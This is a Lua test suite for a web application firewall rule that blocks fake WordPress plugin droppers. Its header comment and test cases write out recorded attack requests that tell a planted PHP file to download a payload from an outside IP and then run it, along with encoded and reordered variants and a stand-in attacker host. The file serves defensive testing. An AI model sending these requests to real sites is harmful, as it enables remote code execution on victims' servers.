-- Tests for rule 440 (rule_plugin_dropper_cmd, WAF_BACKDOOR, block): the
-- command call of a fake-plugin dropper on its own PHP file. The two calls
-- seen on vol2.gr (titan, 2026-11-04), right after the plugin upload:
--   GET /wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php?task=download&url=http://151.245.195.51/bog
--   GET /wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php?task=run

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local snap = waf.get_config()
check(snap.rule_plugin_dropper_cmd == "block", "rule 440 ships at block (got " .. tostring(snap.rule_plugin_dropper_cmd) .. ")")

local P = "/wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php"

local function req(uri, args, opts)
  opts = opts or {}
  local headers = { ["user-agent"] = "Mozilla/5.0" }
  if opts.ct then headers["content-type"] = opts.ct end
  return {
    uri = uri, raw_uri = uri, args = args or "", method = opts.method or "GET",
    ip = "217.60.184.48", headers = headers, body = opts.body or "", cookie = "",
  }
end

local function fires(ctx, tag, label)
  local hit, reason, _, action, _, rule_id = waf.check(ctx)
  check(hit == true, label .. " — hit (got " .. tostring(hit) .. ")")
  check(reason == "WAF_BACKDOOR:PLUGIN_CMD:" .. tag, label .. " — reason …:" .. tag .. " (got " .. tostring(reason) .. ")")
  check(action == "block", label .. " — block (got " .. tostring(action) .. ")")
  check(tonumber(rule_id) == 440, label .. " — rule 440 (got " .. tostring(rule_id) .. ")")
end
local function clean(ctx, label)
  local hit, reason = waf.check(ctx)
  check(hit ~= true, label .. " — must not fire (got " .. tostring(reason) .. ")")
end

-- Every rule at its shipped tier: the attack calls block (whichever rule
-- takes the headline, the request is refused).
do
  local hit, _, _, action = waf.check(req(P, "task=download&url=http://151.245.195.51/bog"))
  check(hit == true and action == "block", "the vol2 download call is blocked with every rule at its default (got " .. tostring(action) .. ")")
  hit, _, _, action = waf.check(req(P, "task=run"))
  check(hit == true and action == "block", "the vol2 run call is blocked with every rule at its default (got " .. tostring(action) .. ")")
end

-- Then rule 440 alone.
for k, _ in pairs(snap) do
  if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
end
waf.set_rule("rule_plugin_dropper_cmd", "block")

-- ── The two calls, and the forms PHP reads the same way ─────────────────────
fires(req(P, "task=download&url=http://151.245.195.51/bog"), "DOWNLOAD", "the vol2 download call")
fires(req(P, "task=run"), "RUN", "the vol2 run call")
fires(req(P, "url=https://evil.example/x.zip&task=download"), "DOWNLOAD", "fields in either order, https")
fires(req(P, "task=Download&url=HTTP://1.2.3.4/a"), "DOWNLOAD", "case")
fires(req(P, "task=%20run%20"), "RUN", "blanks around the value")
fires(req(P, "%74ask=run"), "RUN", "an encoded field name")
fires(req(P, "x=1&task=run&x=2"), "RUN", "among other fields")
fires(req(P, "task=noop&task=run"), "RUN", "a duplicate: every value is tested")
fires(req(P, "task=download&url=ftp://1.2.3.4/a&task=run"), "DOWNLOAD", "download before run")
fires(req("/wp-content/mu-plugins/loader/loader.php", "task=run"), "RUN", "mu-plugins")
fires(req("/blog/wp-content/plugins/x/x.php", "task=run"), "RUN", "WordPress in a subdirectory")
fires(req("/WP-CONTENT/Plugins/X/X.PHP", "task=run"), "RUN", "path case")
fires(req(P .. "/extra", "task=run"), "RUN", "PATH_INFO after the .php")
fires(req("/wp-content/plugins/x/inc/deep/run.php", "task=run"), "RUN", "a file deeper in the plugin")
fires(req(P, "", { method = "POST", body = "task=run", ct = "application/x-www-form-urlencoded" }),
  "RUN", "the field in a form body")
fires(req(P, "", { method = "POST", body = "task=download&url=http%3A%2F%2F1.2.3.4%2Fp",
  ct = "application/x-www-form-urlencoded" }), "DOWNLOAD", "an encoded url in a form body")

-- ── Left alone ───────────────────────────────────────────────────────────────
clean(req(P, "task=download"), "download without a url")
clean(req(P, "task=download&url=/local/path"), "download with a url that is not one")
clean(req(P, "task=install"), "another task value")
clean(req(P, "mytask=run&task_id=run"), "other field names")
clean(req(P, ""), "the plugin file with no query")
clean(req("/index.php", "option=com_x&task=run"), "Joomla's task on its front controller")
clean(req("/administrator/index.php", "option=com_installer&task=download&url=http://x/y"), "Joomla's admin")
clean(req("/wp-admin/admin.php", "page=x&task=run"), "a WordPress admin page")
clean(req("/wp-content/plugins/x/assets/app.js", "task=run"), "a static asset under plugins")
clean(req("/wp-content/plugins/x/readme.txt", "task=run"), "a text file under plugins")
clean(req("/wp-content/uploads/x.php", "task=run"), "uploads (not a plugin dir)")
clean(req("/wp-content/themes/t/functions.php", "task=run"), "a theme file (residual, not keyed)")
clean(req("/wp-content/plugins-old/x/x.php", "task=run"), "a directory only named like plugins")
clean(req("/index.php/wp-content/plugins/x/readme.txt", "task=run"), "a front controller with PATH_INFO")
clean(req("/app.php/wp-content/plugins/x/x.php", "task=run"), "a front controller whose PATH_INFO ends in .php")

if fails > 0 then
  io.stderr:write(fails .. " failure(s)\n")
  os.exit(1)
end
print("cfm_waf_plugin_dropper_cmd_test: OK")
